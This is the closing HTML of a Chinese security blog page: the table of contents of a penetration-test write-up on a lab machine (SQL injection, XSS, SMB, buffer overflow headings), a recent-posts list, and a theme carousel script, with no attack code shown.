注入</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#2-2-1%E6%B3%A8%E5%85%A5%E7%82%B9%E5%9C%A8-username%EF%BC%88sql-1-%EF%BC%89"><span class="toc-number">3.2.1.</span> <span class="toc-text">2.2.1注入点在 username（sql 1 ）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-2-1-%E6%B3%A8%E5%85%A5%E7%82%B9%E5%9C%A8-password%EF%BC%88sql-2-%EF%BC%89"><span class="toc-number">3.2.2.</span> <span class="toc-text">2.2.1 注入点在 password（sql 2 ）</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-3-80%E7%AB%AF%E5%8F%A3-http-192-168-5-136-admin-profile-php-%E7%9A%84-sql-%E6%B3%A8%E5%85%A5"><span class="toc-number">3.3.</span> <span class="toc-text">2.3 80端口 http:&#x2F;&#x2F;192.168.5.136&#x2F;admin&#x2F;profile.php 的 sql 注入</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#2-3-1%E6%B3%A8%E5%85%A5%E7%82%B9%E5%9C%A8-username%EF%BC%88sql-3-%EF%BC%89"><span class="toc-number">3.3.1.</span> <span class="toc-text">2.3.1注入点在 username（sql 3 ）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-3-2-%E6%B3%A8%E5%85%A5%E7%82%B9%E5%9C%A8-password-%EF%BC%88sql-4-%EF%BC%89"><span class="toc-number">3.3.2.</span> <span class="toc-text">2.3.2 注入点在 password （sql 4 ）</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-4-80%E7%AB%AF%E5%8F%A3-http-192-168-5-136-view-%E7%9A%84sql%E6%B3%A8%E5%85%A5"><span class="toc-number">3.4.</span> <span class="toc-text">2.4 80端口 http:&#x2F;&#x2F;192.168.5.136&#x2F;view 的sql注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-4-sql%E6%B3%A8%E5%85%A5%E4%B8%87%E8%83%BD%E5%AF%86%E7%A0%81"><span class="toc-number">3.5.</span> <span class="toc-text">2.4 sql注入万能密码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-5-xss"><span class="toc-number">3.6.</span> <span class="toc-text">2.5 xss</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AD%98%E5%82%A8%E5%9E%8Bxss%EF%BC%881%EF%BC%89"><span class="toc-number">3.6.1.</span> <span class="toc-text">存储型xss（1）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AD%98%E5%82%A8%E5%9E%8Bxss%EF%BC%882%EF%BC%89"><span class="toc-number">3.6.2.</span> <span class="toc-text">存储型xss（2）</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-6-SMB-%E6%9C%8D%E5%8A%A1%EF%BC%88139-445%EF%BC%89SMB-%E5%85%81%E8%AE%B8-guest-%E5%8C%BF%E5%90%8D%E8%AE%BF%E9%97%AE"><span class="toc-number">3.7.</span> <span class="toc-text">2.6  SMB 服务（139&#x2F;445）SMB 允许 guest 匿名访问</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#RCE-%EF%BC%88%E6%96%B0%E5%A2%9E%E5%8A%A0%EF%BC%89"><span class="toc-number">3.8.</span> <span class="toc-text">RCE （新增加）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8F%90%E6%9D%83%EF%BC%88%E6%96%B0%E5%A2%9E%E5%8A%A0%EF%BC%89"><span class="toc-number">3.9.</span> <span class="toc-text">提权（新增加）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-7-7777%E5%8F%AF%E7%96%91%E7%AB%AF%E5%8F%A3%EF%BC%8C%E5%8F%AF%E8%83%BD%E5%AD%98%E5%9C%A8-%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA"><span class="toc-number">3.10.</span> <span class="toc-text">2.7 7777可疑端口，可能存在 缓冲区溢出</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%85%88%E6%80%80%E7%96%91%E5%8F%AF%E8%83%BD%E5%8F%AF%E4%BB%A5%E6%89%A7%E8%A1%8C%E4%BB%A3%E7%A0%81"><span class="toc-number">3.10.1.</span> <span class="toc-text">先怀疑可能可以执行代码</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%86%8D%E5%B0%9D%E8%AF%95%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA"><span class="toc-number">3.10.2.</span> <span class="toc-text">再尝试缓冲区溢出</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-8-%E6%95%8F%E6%84%9F%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2"><span class="toc-number">3.11.</span> <span class="toc-text">2.8 敏感文件泄露</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-9-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1"><span class="toc-number">3.12.</span> <span class="toc-text">2.9 代码审计</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%EF%BC%88%E9%AB%98%E5%8D%B1%EF%BC%89"><span class="toc-number">3.12.1.</span> <span class="toc-text">缓冲区溢出漏洞（高危）</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-vulnerable-%E5%87%BD%E6%95%B0%E4%B8%AD%E7%9A%84%E6%A0%88%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA"><span class="toc-number">3.12.1.1.</span> <span class="toc-text">1. vulnerable 函数中的栈缓冲区溢出</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%85%B6%E4%BB%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%93%8D%E4%BD%9C%E7%9A%84%E6%BA%A2%E5%87%BA%E9%A3%8E%E9%99%A9"><span class="toc-number">3.12.1.2.</span> <span class="toc-text">其他字符串操作的溢出风险</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E5%86%85%E5%AD%98%E6%93%8D%E4%BD%9C%E4%B8%8D%E8%A7%84%E8%8C%83"><span class="toc-number">3.12.2.</span> <span class="toc-text">二、内存操作不规范</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%86%85%E5%AD%98%E5%88%9D%E5%A7%8B%E5%8C%96%E9%95%BF%E5%BA%A6%E9%94%99%E8%AF%AF"><span class="toc-number">3.12.2.1.</span> <span class="toc-text">内存初始化长度错误</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-recv-%E8%BF%94%E5%9B%9E%E5%80%BC%E6%9C%AA%E6%A0%A1%E9%AA%8C"><span class="toc-number">3.12.2.2.</span> <span class="toc-text">2. recv 返回值未校验</span></a></li></ol></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2026/02/22/%E2%80%9C%E5%8E%9F%E7%A5%9E%E2%80%9Djs%E9%80%86%E5%90%91/" title="“原神”js逆向"><img src="/img/weierlite.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="“原神”js逆向"/></a><div class="content"><a class="title" href="/2026/02/22/%E2%80%9C%E5%8E%9F%E7%A5%9E%E2%80%9Djs%E9%80%86%E5%90%91/" title="“原神”js逆向">“原神”js逆向</a><time datetime="2026-02-22T00:18:55.000Z" title="发表于 2026-02-22 08:18:55">2026-02-22</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/02/21/CTF5%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" title="CTF5靶机渗透测试"><img src="/img/weierlite.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="CTF5靶机渗透测试"/></a><div class="content"><a class="title" href="/2026/02/21/CTF5%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" title="CTF5靶机渗透测试">CTF5靶机渗透测试</a><time datetime="2026-02-21T00:18:55.000Z" title="发表于 2026-02-21 08:18:55">2026-02-21</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/02/21/CTF4%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/" title="CTF4靶机渗透"><img src="/img/shuai.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="CTF4靶机渗透"/></a><div class="content"><a class="title" href="/2026/02/21/CTF4%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/" title="CTF4靶机渗透">CTF4靶机渗透</a><time datetime="2026-02-21T00:18:55.000Z" title="发表于 2026-02-21 08:18:55">2026-02-21</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/02/21/Hackademic.PTR1%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/" title="Hackademic.PTR1靶机渗透"><img src="/img/dao.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Hackademic.PTR1靶机渗透"/></a><div class="content"><a class="title" href="/2026/02/21/Hackademic.PTR1%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/" title="Hackademic.PTR1靶机渗透">Hackademic.PTR1靶机渗透</a><time datetime="2026-02-21T00:18:55.000Z" title="发表于 2026-02-21 08:18:55">2026-02-21</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/02/21/xss%E4%B8%80%E4%BA%9B%E5%AE%9E%E6%88%98%E6%BC%8F%E6%B4%9E/" title="xss一些实战漏洞"><img src="/img/lingboli.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="xss一些实战漏洞"/></a><div class="content"><a class="title" href="/2026/02/21/xss%E4%B8%80%E4%BA%9B%E5%AE%9E%E6%88%98%E6%BC%8F%E6%B4%9E/" title="xss一些实战漏洞">xss一些实战漏洞</a><time datetime="2026-02-21T00:18:55.000Z" title="发表于 2026-02-21 08:18:55">2026-02-21</time></div></div></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2026 By Tubby Little Hero</span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=5.5.5"></script><script src="/js/main.js?v=5.5.5"></script><script src="/js/tw_cn.js?v=5.5.5"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><!-- hexo injector body_end start --><script data-pjax>
+  function butterfly_swiper_injector_config(){
+    var parent_div_git = document.getElementById('recent-posts');
+    var item_html = '<div class="recent-post-item" style="height: auto;width: 100%"><div class="blog-slider swiper-container-fade swiper-container-horizontal" id="swiper_container"><div class="blog-slider__wrp swiper-wrapper" style="transition-duration: 0ms;"><div class="blog-slider__item swiper-slide" style="width: 750px; opacity: 1; transform: translate3d(0px, 0px, 0px); transition-duration: 0ms;"><a class="blog-slider__img" href="2025/07/21/逻辑漏洞/" alt=""><img width="48" height="48" src="/img/dao.jpg" alt="" onerror="this.src=https://unpkg.zhimg.com/akilar-candyassets/image/loading.gif; this.onerror = null;"/></a><div class="blog-slider__content"><span class="blog-slider__code">2025-07-21</span><a class="blog-slider__title" href="2025/07/21/逻辑漏洞/" alt="">逻辑漏洞</a><div class="blog-slider__text">逻辑漏洞</div><a class="blog-slider__button" href="2025/07/21/逻辑漏洞/" alt="">详情   </a></div></div><div class="blog-slider__item swiper-slide" style="width: 750px; opacity: 1; transform: translate3d(0px, 0px, 0px); transition-duration: 0ms;"><a class="blog-slider__img" href="2025/07/21/源码框架漏洞/" alt=""><img width="48" height="48" src="/img/shuai.jpg" alt="" onerror="this.src=https://unpkg.zhimg.com/akilar-candyassets/image/loading.gif; this.onerror = null;"/></a><div class="blog-slider__content"><span class="blog-slider__code">2025-07-21</span><a class="blog-slider__title" href="2025/07/21/源码框架漏洞/" alt="">框架漏洞</a><div class="blog-slider__text">源码框架漏洞</div><a class="blog-slider__button" href="2025/07/21/源码框架漏洞/" alt="">详情   </a></div></div><div class="blog-slider__item swiper-slide" style="width: 750px; opacity: 1; transform: translate3d(0px, 0px, 0px); transition-duration: 0ms;"><a class="blog-slider__img" href="2025/07/21/暴力破解 弱口令/" alt=""><img width="48" height="48" src="/img/leisai.jpg" alt="" onerror="this.src=https://unpkg.zhimg.com/akilar-candyassets/image/loading.gif; this.onerror = null;"/></a><div class="blog-slider__content"><span class="blog-slider__code">2025-07-21</span><a class="blog-slider__title" href="2025/07/21/暴力破解 弱口令/" alt="">暴力破解 弱口令</a><div class="blog-slider__text">web渗透的暴力破解与弱口令</div><a class="blog-slider__button" href="2025/07/21/暴力破解 弱口令/" alt="">详情   </a></div></div><div class="blog-slider__item swiper-slide" style="width: 750px; opacity: 1; transform: translate3d(0px, 0px, 0px); transition-duration: 0ms;"><a class="blog-slider__img" href="2026/02/21/cve/" alt=""><img width="48" height="48" src="/img/2.png" alt="" onerror="this.src=https://unpkg.zhimg.com/akilar-candyassets/image/loading.gif; this.onerror = null;"/></a><div class="blog-slider__content"><span class="blog-slider__code">2026-02-21</span><a class="blog-slider__title" href="2026/02/21/cve/" alt="">CVE-rce</a><div class="blog-slider__text">cve-rce</div><a class="blog-slider__button" href="2026/02/21/cve/" alt="">详情   </a></div></div><div class="blog-slider__item swiper-slide" style="width: 750px; opacity: 1; transform: translate3d(0px, 0px, 0px); transition-duration: 0ms;"><a class="blog-slider__img" href="2025/07/21/文件在操作漏洞/" alt=""><img width="48" height="48" src="/img/leisai.jpg" alt="" onerror="this.src=https://unpkg.zhimg.com/akilar-candyassets/image/loading.gif; this.onerror = null;"/></a><div class="blog-slider__content"><span class="blog-slider__code">2025-07-21</span><a class="blog-slider__title" href="2025/07/21/文件在操作漏洞/" alt="">文件操作漏洞</a><div class="blog-slider__text">文件操作漏洞</div><a class="blog-slider__button" href="2025/07/21/文件在操作漏洞/" alt="">详情   </a></div></div><div class="blog-slider__item swiper-slide" style="width: 750px; opacity: 1; transform: translate3d(0px, 0px, 0px); transition-duration: 0ms;"><a class="blog-slider__img" href="2025/07/21/php数组/" alt=""><img width="48" height="48" src="/img/2.png" alt="" onerror="this.src=https://unpkg.zhimg.com/akilar-candyassets/image/loading.gif; this.onerror = null;"/></a><div class="blog-slider__content"><span class="blog-slider__code">2025-07-21</span><a class="blog-slider__title" href="2025/07/21/php数组/" alt="">php数组</a><div class="blog-slider__text">php数组</div><a class="blog-slider__button" href="2025/07/21/php数组/" alt="">详情   </a></div></div><div class="blog-slider__item swiper-slide" style="width: 750px; opacity: 1; transform: translate3d(0px, 0px, 0px); transition-duration: 0ms;"><a class="blog-slider__img" href="2026/02/21/“长安大学js逆向”/" alt=""><img width="48" height="48" src="/img/lingboli.png" alt="" onerror="this.src=https://unpkg.zhimg.com/akilar-candyassets/image/loading.gif; this.onerror = null;"/></a><div class="blog-slider__content"><span class="blog-slider__code">2026-02-21</span><a class="blog-slider__title" href="2026/02/21/“长安大学js逆向”/" alt="">“长安大学”js逆向</a><div class="blog-slider__text">js逆向</div><a class="blog-slider__button" href="2026/02/21/“长安大学js逆向”/" alt="">详情   </a></div></div><div class="blog-slider__item swiper-slide" style="width: 750px; opacity: 1; transform: translate3d(0px, 0px, 0px); transition-duration: 0ms;"><a class="blog-slider__img" href="2026/02/21/“成都大学”js逆向/" alt=""><img width="48" height="48" src="/img/shuai.jpg" alt="" onerror="this.src=https://unpkg.zhimg.com/akilar-candyassets/image/loading.gif; this.onerror = null;"/></a><div class="blog-slider__content"><span class="blog-slider__code">2026-02-21</span><a class="blog-slider__title" href="2026/02/21/“成都大学”js逆向/" alt="">“成都大学”js逆向</a><div class="blog-slider__text">js逆向</div><a class="blog-slider__button" href="2026/02/21/“成都大学”js逆向/" alt="">详情   </a></div></div><div class="blog-slider__item swiper-slide" style="width: 750px; opacity: 1; transform: translate3d(0px, 0px, 0px); transition-duration: 0ms;"><a class="blog-slider__img" href="2026/02/22/“原神”js逆向/" alt=""><img width="48" height="48" src="/img/weierlite.png" alt="" onerror="this.src=https://unpkg.zhimg.com/akilar-candyassets/image/loading.gif; this.onerror = null;"/></a><div class="blog-slider__content"><span class="blog-slider__code">2026-02-22</span><a class="blog-slider__title" href="2026/02/22/“原神”js逆向/" alt="">“原神”js逆向</a><div class="blog-slider__text">js逆向</div><a class="blog-slider__button" href="2026/02/22/“原神”js逆向/" alt="">详情   </a></div></div><div class="blog-slider__item swiper-slide" style="width: 750px; opacity: 1; transform: translate3d(0px, 0px, 0px); transition-duration: 0ms;"><a class="blog-slider__img" href="2026/02/21/xss一些实战漏洞/" alt=""><img width="48" height="48" src="/img/lingboli.png" alt="" onerror="this.src=https://unpkg.zhimg.com/akilar-candyassets/image/loading.gif; this.onerror = null;"/></a><div class="blog-slider__content"><span class="blog-slider__code">2026-02-21</span><a class="blog-slider__title" href="2026/02/21/xss一些实战漏洞/" alt="">xss一些实战漏洞</a><div class="blog-slider__text">xss漏洞</div><a class="blog-slider__button" href="2026/02/21/xss一些实战漏洞/" alt="">详情   </a></div></div><div class="blog-slider__item swiper-slide" style="width: 750px; opacity: 1; transform: translate3d(0px, 0px, 0px); transition-duration: 0ms;"><a class="blog-slider__img" href="2025/07/21/sql注入（理论）/" alt=""><img width="48" height="48" src="/img/2.png" alt="" onerror="this.src=https://unpkg.zhimg.com/akilar-candyassets/image/loading.gif; this.onerror = null;"/></a><div class="blog-slider__content"><span class="blog-slider__code">2025-07-21</span><a class="blog-slider__title" href="2025/07/21/sql注入（理论）/" alt="">sql注入（理论）</a><div class="blog-slider__text">sql注入</div><a class="blog-slider__button" href="2025/07/21/sql注入（理论）/" alt="">详情   </a></div></div><div class="blog-slider__item swiper-slide" style="width: 750px; opacity: 1; transform: translate3d(0px, 0px, 0px); transition-duration: 0ms;"><a class="blog-slider__img" href="2026/01/11/Metasploitable/" alt=""><img width="48" height="48" src="/img/weierlite.png" alt="" onerror="this.src=https://unpkg.zhimg.com/akilar-candyassets/image/loading.gif; this.onerror = null;"/></a><div class="blog-slider__content"><span class="blog-slider__code">2026-01-11</span><a class="blog-slider__title" href="2026/01/11/Metasploitable/" alt="">Metasploitable渗透测试</a><div class="blog-slider__text">靶场渗透</div><a class="blog-slider__button" href="2026/01/11/Metasploitable/" alt="">详情   </a></div></div><div class="blog-slider__item swiper-slide" style="width: 750px; opacity: 1; transform: translate3d(0px, 0px, 0px); transition-duration: 0ms;"><a class="blog-slider__img" href="2025/07/21/php基础语法/" alt=""><img width="48" height="48" src="/img/shuai.jpg" alt="" onerror="this.src=https://unpkg.zhimg.com/akilar-candyassets/image/loading.gif; this.onerror = null;"/></a><div class="blog-slider__content"><span class="blog-slider__code">2025-07-21</span><a class="blog-slider__title" href="2025/07/21/php基础语法/" alt="">php核心语法</a><div class="blog-slider__text">php入门基础语法简单介绍</div><a class="blog-slider__button" href="2025/07/21/php基础语法/" alt="">详情   </a></div></div><div class="blog-slider__item swiper-slide" style="width: 750px; opacity: 1; transform: translate3d(0px, 0px, 0px); transition-duration: 0ms;"><a class="blog-slider__img" href="2025/07/21/Java类/" alt=""><img width="48" height="48" src="/img/lingboli.png" alt="" onerror="this.src=https://unpkg.zhimg.com/akilar-candyassets/image/loading.gif; this.onerror = null;"/></a><div class="blog-slider__content"><span class="blog-slider__code">2025-07-21</span><a class="blog-slider__title" href="2025/07/21/Java类/" alt="">JAVA类</a><div class="blog-slider__text">Java类</div><a class="blog-slider__button" href="2025/07/21/Java类/" alt="">详情   </a></div></div><div class="blog-slider__item swiper-slide" style="width: 750px; opacity: 1; transform: translate3d(0px, 0px, 0px); transition-duration: 0ms;"><a class="blog-slider__img" href="2025/07/21/JAVA入门/" alt=""><img width="48" height="48" src="/img/2.png" alt="" onerror="this.src=https://unpkg.zhimg.com/akilar-candyassets/image/loading.gif; this.onerror = null;"/></a><div class="blog-slider__content"><span class="blog-slider__code">2025-07-21</span><a class="blog-slider__title" href="2025/07/21/JAVA入门/" alt="">JAVA基础</a><div class="blog-slider__text">Java入门</div><a class="blog-slider__button" href="2025/07/21/JAVA入门/" alt="">详情   </a></div></div><div class="blog-slider__item swiper-slide" style="width: 750px; opacity: 1; transform: translate3d(0px, 0px, 0px); transition-duration: 0ms;"><a class="blog-slider__img" href="2025/07/21/Java方法(函数)/" alt=""><img width="48" height="48" src="/img/shuai.jpg" alt="" onerror="this.src=https://unpkg.zhimg.com/akilar-candyassets/image/loading.gif; this.onerror = null;"/></a><div class="blog-slider__content"><span class="blog-slider__code">2025-07-21</span><a class="blog-slider__title" href="2025/07/21/Java方法(函数)/" alt="">JAVA方法（函数）</a><div class="blog-slider__text">Java方法（函数）</div><a class="blog-slider__button" href="2025/07/21/Java方法(函数)/" alt="">详情   </a></div></div><div class="blog-slider__item swiper-slide" style="width: 750px; opacity: 1; transform: translate3d(0px, 0px, 0px); transition-duration: 0ms;"><a class="blog-slider__img" href="2025/07/21/Java数组/" alt=""><img width="48" height="48" src="/img/dao.jpg" alt="" onerror="this.src=https://unpkg.zhimg.com/akilar-candyassets/image/loading.gif; this.onerror = null;"/></a><div class="blog-slider__content"><span class="blog-slider__code">2025-07-21</span><a class="blog-slider__title" href="2025/07/21/Java数组/" alt="">php核心语法</a><div class="blog-slider__text">Java数组</div><a class="blog-slider__button" href="2025/07/21/Java数组/" alt="">详情   </a></div></div><div class="blog-slider__item swiper-slide" style="width: 750px; opacity: 1; transform: translate3d(0px, 0px, 0px); transition-duration: 0ms;"><a class="blog-slider__img" href="2026/02/21/Hackademic.PTR1靶机渗透/" alt=""><img width="48" height="48" src="/img/dao.jpg" alt="" onerror="this.src=https://unpkg.zhimg.com/akilar-candyassets/image/loading.gif; this.onerror = null;"/></a><div class="blog-slider__content"><span class="blog-slider__code">2026-02-21</span><a class="blog-slider__title" href="2026/02/21/Hackademic.PTR1靶机渗透/" alt="">Hackademic.PTR1靶机渗透</a><div class="blog-slider__text">靶机渗透</div><a class="blog-slider__button" href="2026/02/21/Hackademic.PTR1靶机渗透/" alt="">详情   </a></div></div><div class="blog-slider__item swiper-slide" style="width: 750px; opacity: 1; transform: translate3d(0px, 0px, 0px); transition-duration: 0ms;"><a class="blog-slider__img" href="2026/02/21/CTF4靶机渗透/" alt=""><img width="48" height="48" src="/img/shuai.jpg" alt="" onerror="this.src=https://unpkg.zhimg.com/akilar-candyassets/image/loading.gif; this.onerror = null;"/></a><div class="blog-slider__content"><span class="blog-slider__code">2026-02-21</span><a class="blog-slider__title" href="2026/02/21/CTF4靶机渗透/" alt="">CTF4靶机渗透</a><div class="blog-slider__text">靶机渗透</div><a class="blog-slider__button" href="2026/02/21/CTF4靶机渗透/" alt="">详情   </a></div></div><div class="blog-slider__item swiper-slide" style="width: 750px; opacity: 1; transform: translate3d(0px, 0px, 0px); transition-duration: 0ms;"><a class="blog-slider__img" href="2026/01/14/CTF6/" alt=""><img width="48" height="48" src="/img/2.png" alt="" onerror="this.src=https://unpkg.zhimg.com/akilar-candyassets/image/loading.gif; this.onerror = null;"/></a><div class="blog-slider__content"><span class="blog-slider__code">2026-01-14</span><a class="blog-slider__title" href="2026/01/14/CTF6/" alt="">CTF6渗透测试</a><div class="blog-slider__text">靶场渗透</div><a class="blog-slider__button" href="2026/01/14/CTF6/" alt="">详情   </a></div></div><div class="blog-slider__item swiper-slide" style="width: 750px; opacity: 1; transform: translate3d(0px, 0px, 0px); transition-duration: 0ms;"><a class="blog-slider__img" href="2026/02/21/CTF5靶机渗透测试/" alt=""><img width="48" height="48" src="/img/weierlite.png" alt="" onerror="this.src=https://unpkg.zhimg.com/akilar-candyassets/image/loading.gif; this.onerror = null;"/></a><div class="blog-slider__content"><span class="blog-slider__code">2026-02-21</span><a class="blog-slider__title" href="2026/02/21/CTF5靶机渗透测试/" alt="">CTF5靶机渗透测试</a><div class="blog-slider__text">CTF5靶机渗透测试</div><a class="blog-slider__button" href="2026/02/21/CTF5靶机渗透测试/" alt="">详情   </a></div></div><div class="blog-slider__item swiper-slide" style="width: 750px; opacity: 1; transform: translate3d(0px, 0px, 0px); transition-duration: 0ms;"><a class="blog-slider__img" href="2026/01/22/1.22靶场渗透报告/" alt=""><img width="48" height="48" src="/img/leisai.jpg" alt="" onerror="this.src=https://unpkg.zhimg.com/akilar-candyassets/image/loading.gif; this.onerror = null;"/></a><div class="blog-slider__content"><span class="blog-slider__code">2026-01-22</span><a class="blog-slider__title" href="2026/01/22/1.22靶场渗透报告/" alt="">1.22靶场渗透报告</a><div class="blog-slider__text">靶场渗透</div><a class="blog-slider__button" href="2026/01/22/1.22靶场渗透报告/" alt="">详情   </a></div></div><div class="blog-slider__item swiper-slide" style="width: 750px; opacity: 1; transform: translate3d(0px, 0px, 0px); transition-duration: 0ms;"><a class="blog-slider__img" href="2025/07/21/CSRF攻击/" alt=""><img width="48" height="48" src="/img/lingboli.png" alt="" onerror="this.src=https://unpkg.zhimg.com/akilar-candyassets/image/loading.gif; this.onerror = null;"/></a><div class="blog-slider__content"><span class="blog-slider__code">2025-07-21</span><a class="blog-slider__title" href="2025/07/21/CSRF攻击/" alt="">CSRF攻击</a><div class="blog-slider__text">CSRF攻击</div><a class="blog-slider__button" href="2025/07/21/CSRF攻击/" alt="">详情   </a></div></div></div><div class="blog-slider__pagination swiper-pagination-clickable swiper-pagination-bullets"></div></div></div>';
+    console.log('已挂载butterfly_swiper')
+    parent_div_git.insertAdjacentHTML("afterbegin",item_html)
+    }
+  var elist = 'undefined'.split(',');
+  var cpage = location.pathname;
+  var epage = 'all';
+  var flag = 0;
+
+  for (var i=0;i<elist.length;i++){
+    if (cpage.includes(elist[i])){
+      flag++;
+    }
+  }
+
+  if ((epage ==='all')&&(flag == 0)){
+    butterfly_swiper_injector_config();
+  }
+  else if (epage === cpage){
+    butterfly_swiper_injector_config();
+  }
+  </script><script defer src="https://npm.elemecdn.com/hexo-butterfly-swiper/lib/swiper.min.js"></script><script defer data-pjax src="https://npm.elemecdn.com/hexo-butterfly-swiper/lib/swiper_init.js"></script><!-- hexo injector body_end end --></body></html>
